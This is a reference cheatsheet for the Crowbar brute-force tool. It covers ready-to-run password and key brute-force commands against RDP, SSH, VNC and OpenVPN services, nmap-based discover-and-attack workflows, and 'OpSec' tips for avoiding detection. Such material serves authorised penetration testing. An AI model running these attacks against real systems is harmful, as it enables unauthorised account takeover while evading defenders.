# Crowbar Cheatsheet

## Quick Reference

### RDP Brute Force

```bash
# Single target, single user, password list
crowbar -b rdp -s 192.168.1.100/32 -u admin -C /usr/share/wordlists/rockyou.txt

# Multiple targets, user list, single password
crowbar -b rdp -S targets.txt -U usernames.txt -c password123

# Discovery mode (scan before attack)
crowbar -b rdp -s 192.168.1.0/24 -U users.txt -C passwords.txt -d

# Domain user (backslash notation)
crowbar -b rdp -s 192.168.1.100/32 -u "DOMAIN\\username" -c password123

# Domain user (UPN notation)
crowbar -b rdp -s 192.168.1.100/32 -u "user@DOMAIN" -c password123
```

### SSH Key Brute Force

```bash
# Single key file
crowbar -b sshkey -s 192.168.1.100/32 -u root -k ~/.ssh/id_rsa

# All keys in directory
crowbar -b sshkey -s 192.168.1.100/32 -u root -k ~/.ssh/

# Subnet with discovery
crowbar -b sshkey -s 192.168.1.0/24 -u root -k ~/.ssh/ -d
```

### VNC Key Brute Force

```bash
# Standard VNC key
crowbar -b vnckey -s 192.168.1.100/32 -k ~/.vnc/passwd

# Custom port
crowbar -b vnckey -s 192.168.1.100/32 -p 5902 -k ~/.vnc/passwd
```

### OpenVPN Brute Force

```bash
# With config and certificate
crowbar -b openvpn -s 192.168.1.100/32 -p 1194 -m config.ovpn -k ca.crt -u vpnuser -c vpnpass
```

## Command Options

| Option | Description |
|--------|-------------|
| `-b` | Service: `openvpn`, `rdp`, `sshkey`, `vnckey` |
| `-s` | Target IP/CIDR (e.g., `192.168.1.100/32`) |
| `-S` | Target file (one IP per line) |
| `-u` | Single username |
| `-U` | Username file |
| `-c` | Single password |
| `-C` | Password file |
| `-k` | Key file/directory (SSH/VNC) |
| `-m` | OpenVPN config file |
| `-p` | Port number |
| `-n` | Thread count |
| `-t` | Timeout (seconds) |
| `-d` | Discovery mode |
| `-v` | Verbose output |
| `-vv` | Very verbose output |
| `-D` | Debug mode |
| `-q` | Quiet mode (success only) |
| `-l` | Log file path |
| `-o` | Output file path |

## Output Files

| File | Description |
|------|-------------|
| `crowbar.log` | All brute force attempts |
| `crowbar.out` | Successful attempts only |

## Common Workflows

### Discover and Attack

```bash
# 1. Find RDP hosts
nmap -p 3389 --open 192.168.1.0/24 -oG - | grep "3389/open" | awk '{print $2}' > rdp_hosts.txt

# 2. Brute force discovered hosts
crowbar -b rdp -S rdp_hosts.txt -u administrator -C passwords.txt
```

### SSH Key Reuse

```bash
# 1. Find SSH hosts
nmap -p 22 --open 192.168.1.0/24 -oG - | grep "22/open" | awk '{print $2}' > ssh_hosts.txt

# 2. Test all keys against all hosts
for host in $(cat ssh_hosts.txt); do
    crowbar -b sshkey -s $host/32 -u root -k ~/.ssh/ -q
done
```

## Troubleshooting

### Common Errors

**"Connection refused"**:
```bash
# Verify service is running
nmap -p 3389 192.168.1.100
```

**"Permission denied"**:
```bash
# Check key permissions
chmod 600 ~/.ssh/id_rsa
```

**"Timeout"**:
```bash
# Increase timeout
crowbar -b sshkey -s 192.168.1.100/32 -u root -k ~/.ssh/id_rsa -t 60
```

## OpSec Tips

1. **Reduce threads**: Use `-n 1` to avoid detection
2. **Increase timeout**: Use `-t 60` to slow down attempts
3. **Use quiet mode**: Use `-q` to only show successes
4. **Log everything**: Use `-l` to maintain audit trail

## Resources

- **GitHub**: https://github.com/galkan/crowbar
- **Kali Docs**: https://www.kali.org/tools/crowbar/
